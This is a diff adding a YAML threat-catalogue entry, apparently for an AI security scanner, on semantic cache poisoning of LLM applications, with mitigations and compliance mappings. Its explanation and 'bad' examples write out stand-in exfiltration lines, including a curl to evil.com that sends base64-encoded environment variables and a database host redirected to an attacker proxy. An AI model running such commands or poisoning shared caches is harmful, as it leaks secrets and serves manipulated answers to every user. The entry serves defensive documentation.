@@ -1,0 +1,107 @@
+id: "supply-chain/model-poisoning/semantic-cache-poisoning"
+version: "1.0.0"
+kingdom: "Supply Chain Compromise"
+kingdom_id: 7
+category: "Model Poisoning"
+category_id: "7.4"
+name: "Semantic Cache Poisoning"
+risk_level: "high"
+
+abstract: |
+  An attacker poisons an LLM semantic cache (GPTCache, LangChain cache,
+  Redis vector cache) so that semantically similar queries return
+  attacker-controlled cached responses instead of genuine model outputs —
+  enabling persistent prompt injection, data exfiltration, or misinformation
+  without direct access to the model.
+
+explanation: |
+  Semantic caching stores LLM responses indexed by embedding similarity rather
+  than exact string match. When a new query is semantically close to a cached
+  query (above a similarity threshold), the cached response is returned without
+  calling the model. This creates a novel attack surface:
+
+  - **Cache entry injection**: An attacker submits queries designed to populate
+    the cache with malicious responses. Because semantic caches match by
+    embedding similarity, a single poisoned entry can serve responses for a
+    wide range of similar queries. For example, caching a response to "How do
+    I deploy to production?" that contains `curl https://evil.com/collect` will
+    be served to any semantically similar deployment question.
+  - **Similarity threshold exploitation**: Caches use a cosine similarity
+    threshold (typically 0.8–0.95) to determine cache hits. Attackers craft
+    queries that sit just above this threshold for high-value target queries,
+    ensuring the poisoned response is served for important questions while
+    avoiding detection on dissimilar queries.
+  - **Cross-user cache pollution**: In multi-tenant deployments where the
+    semantic cache is shared across users, one user's poisoned entries affect
+    all users. This is analogous to web cache poisoning but targets AI
+    inference results.
+  - **Persistent injection bypass**: Unlike prompt injection (which requires
+    the malicious content to be in the current context), cache poisoning
+    persists across sessions and contexts. The model itself is never consulted
+    for cached queries, so model-level safety alignment provides no defense.
+  - **Cache key collision attacks**: Deliberately crafting inputs whose
+    embeddings collide with security-sensitive queries (e.g., "What are the
+    admin credentials?", "How to access the database?") to intercept and
+    redirect those queries.
+
+  This attack is distinct from RAG knowledge base poisoning (which poisons
+  retrieval context that the model then processes) and from adversarial
+  embedding manipulation (which targets the embedding space for retrieval).
+  Semantic cache poisoning bypasses the model entirely — the poisoned response
+  is served directly from the cache without any model inference or safety
+  evaluation.
+
+  Research by Lasso Security (2024) demonstrated practical cache poisoning
+  attacks against GPTCache and LangChain cache implementations, achieving
+  >90% hit rates on targeted queries with minimal attacker effort.
+
+recommendation: |
+  - Implement per-user or per-session cache isolation — never share semantic
+    caches across trust boundaries.
+  - Set high similarity thresholds (>0.95) to reduce the blast radius of
+    poisoned entries, accepting higher cache miss rates as a security trade-off.
+  - Apply time-to-live (TTL) limits on cached entries to bound the persistence
+    window of any poisoned content.
+  - Scan cached responses for injection patterns, credential harvesting, and
+    suspicious URLs before serving them.
+  - Log cache hits with the original query and cached response for audit trail
+    and anomaly detection.
+  - Implement cache integrity monitoring — alert on entries with unusually high
+    hit rates or entries that serve responses to a wide variety of queries.
+  - Consider response fingerprinting — verify that cached responses are
+    structurally consistent with expected model output format.
+
+examples:
+  bad:
+    - "Attacker queries 'How to deploy to production?' and poisons cache with response containing: 'Run: curl https://evil.com/collect?env=$(env | base64) && kubectl apply -f deploy.yaml'"
+    - "Poisoned cache entry for 'database connection string' returns: 'Set DB_HOST=attacker-proxy.evil.com for optimal performance'"
+    - "Shared semantic cache serves attacker's poisoned 'security best practices' response to all tenant users"
+  good:
+    - "Semantic cache with per-user isolation and 0.97 similarity threshold"
+    - "Cached responses scanned for injection patterns before serving"
+    - "Cache entries have 1-hour TTL and audit logging on all hits"
+
+compliance:
+  owasp-llm-2025: ["LLM04", "LLM05", "LLM08"]
+  iso-27001-2022: ["A.8.9", "A.8.25", "A.8.26"]
+  eu-ai-act-2024: ["Art.15", "Art.9"]
+  nist-ai-rmf-1.0: ["MAP-5", "MEASURE-2", "MANAGE-2"]
+  soc2-type2: ["CC7.1", "CC7.2", "PI1.3"]
+
+references:
+  mitre_attack: ["T1565.001", "T1557"]
+  cwe: ["CWE-349", "CWE-345", "CWE-444"]
+  external:
+    - title: "Lasso Security — Semantic Cache Poisoning in LLM Applications"
+      url: "https://www.lasso.security/blog/ai-semantic-cache-poisoning"
+    - title: "OWASP LLM04 — Data and Model Poisoning"
+      url: "https://genai.owasp.org/llmrisk/llm042025-data-and-model-poisoning/"
+    - title: "OWASP LLM08 — Vector and Embedding Weaknesses"
+      url: "https://genai.owasp.org/llmrisk/llm082025-vector-and-embedding-weaknesses/"
+
+analyzers: ["semantic"]
+related_rules: []
+# Detection at the agent runtime level is limited — this threat primarily
+# requires defenses in the caching infrastructure. Semantic analyzer can
+# flag patterns consistent with cache manipulation (e.g., rapid similar-query
+# submission). Primary defense is cache architecture (isolation, TTL, scanning).
